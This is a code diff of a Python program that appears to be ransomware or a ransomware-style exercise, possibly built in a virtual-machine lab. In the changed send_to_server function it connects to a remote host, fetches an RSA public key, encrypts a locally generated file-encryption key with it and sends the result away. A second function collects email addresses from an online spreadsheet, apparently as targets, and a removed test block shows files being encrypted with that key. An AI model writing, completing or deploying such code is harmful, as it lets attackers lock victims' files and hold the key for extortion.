@@ -195,16 +195,17 @@ def decrypt_with_RSA(ciphertext, private_key):
 #     # Return the ciphertext as a base64-encoded string
 #     return base64.b64encode(ciphertext_bytes)
 
-def send_to_server(encoded_encrypted_msg):
-    SERVER_IP = '127.0.0.1'
+def send_to_server(ascii_key):
+    SERVER_IP = '10.0.2.2'
     SERVER_PORT = 5678
-
     with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
-        data = s.recv(1024)
-        print(data)
+        exported_public_key = s.recv(1024)
+        public_key = RSA.import_key(exported_public_key)
+        byte_ascii_key = ascii_key.encode()
+        encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
         s.send(encoded_encrypted_msg)
-    input()
+    return encoded_encrypted_msg
 
 def get_emails_from_csv():
     url = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
@@ -214,20 +215,3 @@ def get_emails_from_csv():
     # return only the emails
     emails = [row['Email'] for row in data]
     return emails
-
-
-
-'''
-def testEncryption():
-    file_path = r'file_test.txt'
-    ascii_key = generate_key(16)
-    with open(file_path, 'r') as f:
-        data = f.read()
-    encrypted_data = encrypt_data(ascii_key, data)
-    with open('encrypted_file.txt', 'wb') as f:
-        f.write(encrypted_data)
-
-    decrypted_data = decrypt_data(ascii_key, encrypted_data)
-    with open('decr.txt', 'w') as f:
-        f.write(decrypted_data)
-'''
